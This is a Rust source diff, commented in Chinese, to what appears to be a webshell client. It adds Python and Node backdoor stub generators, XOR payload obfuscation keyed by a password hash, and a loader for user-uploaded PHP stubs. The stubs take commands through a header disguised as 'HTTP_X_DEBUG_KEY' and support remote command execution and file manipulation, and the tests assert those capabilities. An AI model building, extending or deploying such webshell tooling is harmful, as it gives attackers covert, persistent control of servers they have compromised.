@@ -16,6 +16,8 @@ use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pk
 use md5::{Digest, Md5};
 
 use crate::asp_stub::asp_stub;
+use crate::node_stub::node_stub;
+use crate::python_stub::python_stub;
 use crate::jsp_stub::{aspx_stub, jsp_stub};
 use crate::protocol::ProtocolError;
 
@@ -268,7 +270,87 @@ pub fn b64_call_expr(args: &str) -> String {
 }
 
 /// 支持的脚本语言（stub 生成目标）。
-pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];
+pub const STUB_LANGUAGES: [&str; 6] = ["php", "asp", "aspx", "jsp", "python", "node"];
+
+// ---------------------------------------------------------------------------
+// 自定义编码器（E3）：XOR 载荷 + 用户上传的 stub 模板（运行时注册）
+// ---------------------------------------------------------------------------
+
+/// 用户自定义 stub 模板（register_custom_encoder 写入）。
+static CUSTOM_STUB: std::sync::LazyLock<std::sync::Mutex<Option<String>>> =
+    std::sync::LazyLock::new(|| std::sync::Mutex::new(None));
+
+/// 运行时注册自定义 stub（id 固定 "custom"，仅支持 PHP stub）。
+pub fn set_custom_stub(stub: &str) -> Result<(), ProtocolError> {
+    if stub.len() > 256 * 1024 {
+        return Err(ProtocolError::NotSupported(
+            "自定义 stub 超过大小上限（256KB）".into(),
+        ));
+    }
+    if !stub.contains("<?php") {
+        return Err(ProtocolError::NotSupported(
+            "自定义 stub 必须是 PHP 脚本（需包含 <?php）".into(),
+        ));
+    }
+    *CUSTOM_STUB
+        .lock()
+        .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))? = Some(stub.to_string());
+    Ok(())
+}
+
+/// 自定义编码器：载荷编解码与 native XOR 一致，stub 为用户上传模板。
+pub struct CustomEncoder;
+
+impl PayloadEncoder for CustomEncoder {
+    fn id(&self) -> &'static str {
+        "custom"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "自定义（Custom：用户 stub + XOR 载荷）"
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_hex(password).into_bytes();
+        let xored: Vec<u8> = code
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(xored)
+    }
+
+    fn decode(&self, payload: &str, password: &str) -> Result<Vec<u8>, ProtocolError> {
+        let raw = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|_| ProtocolError::ParseError("响应 Base64 解码失败".to_string()))?;
+        let key = md5_hex(password).into_bytes();
+        Ok(raw
+            .iter()
+            .enumerate()
+            .map(|(i, b)| b ^ key[i % key.len()])
+            .collect())
+    }
+
+    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
+        if language != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "自定义编码器暂仅支持 PHP（{language}）"
+            )));
+        }
+        CUSTOM_STUB
+            .lock()
+            .map_err(|_| ProtocolError::NotSupported("stub 存储锁异常".into()))?
+            .clone()
+            .ok_or_else(|| {
+                ProtocolError::NotSupported(
+                    "尚未注册自定义 stub（请在插件面板使用 register_custom_encoder 上传）"
+                        .into(),
+                )
+            })
+    }
+}
 
 /// 编码器：载荷编码 + stub 生成。
 pub trait PayloadEncoder: Send + Sync {
@@ -337,6 +419,7 @@ impl EncoderRegistry {
                 Box::new(NativeEncoder { crypto: "des" }),
                 Box::new(NativeEncoder { crypto: "chacha20" }),
                 Box::new(NativeEncoder { crypto: "rabbit" }),
+                Box::new(CustomEncoder),
             ],
         }
     }
@@ -2000,6 +2083,48 @@ impl PayloadEncoder for NativeEncoder {
                     &xor_hex(&key_hex, &xk),
                 ))
             }
+            "python" => {
+                let xk = php_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                let h = |op: &str| -> String {
+                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+                    let mut n: u64 = 0;
+                    for (i, c) in digest.chars().take(8).enumerate() {
+                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+                    }
+                    n.to_string()
+                };
+                Ok(python_stub(
+                    &xk,
+                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    &xor_hex(token, &xk),
+                    &xor_hex(&key_hex, &xk),
+                    &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"),
+                    &h("delete"), &h("rename"), &h("mkdir"), &h("touch"),
+                ))
+            }
+            "node" => {
+                let xk = php_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                let h = |op: &str| -> String {
+                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+                    let mut n: u64 = 0;
+                    for (i, c) in digest.chars().take(8).enumerate() {
+                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+                    }
+                    n.to_string()
+                };
+                Ok(node_stub(
+                    &xk,
+                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    &xor_hex(token, &xk),
+                    &xor_hex(&key_hex, &xk),
+                    &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"),
+                    &h("delete"), &h("rename"), &h("mkdir"), &h("touch"),
+                ))
+            }
             other => Err(ProtocolError::NotSupported(format!(
                 "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -2052,14 +2177,40 @@ mod tests {
     }
 
     #[test]
+    fn python_node_stub_generation() {
+        let encoder = NativeEncoder { crypto: "xor" };
+        let stub = encoder.stub("python", "secret").unwrap();
+        assert!(stub.contains("#!/usr/bin/env python3"), "Python stub 应为 CGI 脚本");
+        assert!(stub.contains("formData"), "应支持 formData 参数");
+        assert!(stub.contains("urllib.parse.parse_qs"), "应从请求体解析 formData");
+        assert!(stub.contains("subprocess.run"), "应支持命令执行");
+        assert!(stub.contains("os.utime"), "应支持 touch");
+        assert!(!stub.contains("{xk}"), "占位符应已替换");
+        let node = encoder.stub("node", "secret").unwrap();
+        assert!(node.contains("require('http')"), "Node stub 应为 HTTP 服务");
+        assert!(node.contains("URLSearchParams"), "应解析 formData");
+        assert!(node.contains("child_process"), "应支持命令执行");
+        assert!(node.contains("utimesSync"), "应支持 touch");
+        assert!(!node.contains("{xk}"), "占位符应已替换");
+    }
+
+    #[test]
     fn stub_generation_all_languages() {
+        // XorBase64 / Base64 仅支持 php/asp/aspx/jsp（python/node 仅 native）
         for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
-            for language in STUB_LANGUAGES {
+            for language in ["php", "asp", "aspx", "jsp"] {
                 let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                     panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                 });
                 assert!(!stub.is_empty());
             }
+        }
+        // native 支持全部 6 种语言（python/node 已覆盖）
+        for language in STUB_LANGUAGES {
+            let stub = NativeEncoder { crypto: "xor" }.stub(language, "secret").unwrap_or_else(|error| {
+                panic!("native 生成 {language} stub 失败：{error}")
+            });
+            assert!(!stub.is_empty());
         }
     }
 
@@ -2223,10 +2374,10 @@ mod tests {
         assert_eq!(
             ids,
             vec![
-                "native", "native_aes_cbc", "native_aes_ecb",
+                "custom", "native", "native_aes_cbc", "native_aes_ecb",
                 "native_chacha20", "native_des", "native_rabbit",
             ],
-            "注册表应暴露 NATIVE 系列 + 两个自加密编码器（PHP5 兼容）"
+            "注册表应暴露 NATIVE 系列 + 自加密编码器 + 自定义（Custom）"
         );
     }
 
